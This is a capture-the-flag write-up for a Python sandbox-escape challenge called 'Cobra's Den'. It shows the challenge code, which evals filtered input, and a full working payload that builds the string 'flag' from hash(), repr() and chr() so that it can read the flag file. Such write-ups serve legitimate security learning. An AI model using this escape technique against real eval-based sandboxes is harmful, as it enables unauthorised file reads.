# Cobra's Den 

## Description: You have entered the Cobra's Den, can you find a way to escape?

## Files

<details>
	<summary>Chal.py</summary>

```py
# flag stored at 'flag' in current dir
import builtins

all_builtins = dir(builtins)
filtered_builtins = {name: getattr(builtins, name) for name in all_builtins if len(name) <= 4}
filtered_builtins.update({'print': print})
print(filtered_builtins)
whitelist = "<ph[(cobras.den)]+~"
security_check = lambda s: any(c not in whitelist for c in s) or len(s) > 1115 or s.count('.') > 1

print('Good luck!')
while True:
    cmd = input("Input: ")
    if security_check(cmd):
        print("No dice!")
    else:
        try:
            eval(f"print({cmd})", {"__builtins__": filtered_builtins})
        except SyntaxError as e:
            print(f"Syntax error: {e}")
        except Exception as e:
            print(f"An error occurred: {e}")
```
</details>

## Understanding the code

The code allows all builtins with length of 4 or less. However, you can only use functions that are comprised of `<ph[(cobras.den)]+~`. It executes our input like this: `print({cmd})`. The flag is in `flag` in current directory, so we can do a simple `open('flag').read()` (since it prints our input, it is equivalent to: `print(open('flag').read())`)

If we look at the functions, we can use `open` and `read` since all characters are in the whitelist and the length is four. The challenge is to create the string 'flag'.

## Functions

Looking at the builtins, there are some important functions we could use to create the string:
- `chr`
- `ord`
- `hash`
- `abs`
- `repr`

`chr` `and` ord are important functions, as they can be used to create letters.

We can also use `+` ,`<` and `~` (bitwise not).

## A trick

We could just do `chr(102)` to create 'f' right? Unforunately, no. We cannot use numbers.
A trick in python is that `True+True` is considered 2! `True+True+True` is 3 and so on!

## Creating numbers

We can't just type `True` either, since "T" is not whitelisted, but we can create it!

We can use the `hash` function to do so. Running `hash(())` in python gives: `5740354900026072187`

So, `hash(())<hash(())` gives us False! Now let's create True. Remember the `~`? it also flips the sign bit, so `~hash(())` is `-5740354900026072188`

`~hash(())<hash(())` is True!

## A problem

We can just add `~hash(())<hash(())` to itself: `~hash(())<hash(())+~hash(())<hash(())` to create numbers. However, we have a length limit: 1115. We have to figure out a different way.

# Solution

Remember `repr`: Return the canonical string representation of the object.

`repr(False)` returns the string "False". I can use the first index to get the letter "a"! 
Since `True` is equal to 1, `'False'[True]` outputs 'a'.

The first letter we need is 'f', however False has a capital "F". well, we can take the ASCII value of "a" by accessing the first index of the string "False" and then calling `ord` on it: `ord(repr(hash(())<hash(()))[~hash(())<hash(())])` and then add 5 to create "f": `chr(ord(repr(hash(())<hash(()))[~hash(())<hash(())])+(~hash(())<hash(()))+(~hash(())<hash(()))+(~hash(())<hash(()))+(~hash(())<hash(()))+(~hash(())<hash(())))`!

Then, we can use `repr(hash(())<hash(()))[(~hash(())<hash(()))+(~hash(())<hash(()))]`  to create "l" because `'False'[True+True]` outputs "l".

We can use `repr(hash(())<hash(()))[(~hash(())<hash(()))]` again to create "a"

Finally, create "g" the same way we created "f": `chr(ord(repr(hash(())<hash(()))[~hash(())<hash(())])+(~hash(())<hash(()))+(~hash(())<hash(()))+(~hash(())<hash(()))+(~hash(())<hash(()))+(~hash(())<hash(()))+(~hash(())<hash(())))`
Then, we can add all of these strings together and wrap it in `open` and `.read()` to get our flag!

Final payload:
```
open(chr(ord(repr(hash(())<hash(()))[~hash(())<hash(())])+(~hash(())<hash(()))+(~hash(())<hash(()))+(~hash(())<hash(()))+(~hash(())<hash(()))+(~hash(())<hash(())))+repr(hash(())<hash(()))[(~hash(())<hash(()))+(~hash(())<hash(()))]+repr(hash(())<hash(()))[(~hash(())<hash(()))]+chr(ord(repr(hash(())<hash(()))[~hash(())<hash(())])+(~hash(())<hash(()))+(~hash(())<hash(()))+(~hash(())<hash(()))+(~hash(())<hash(()))+(~hash(())<hash(()))+(~hash(())<hash(())))).read()
```

# Flag: irisctf{pyth0n_has_s(+([]<[]))me_whacky_sh(+([]<[[]]))t}
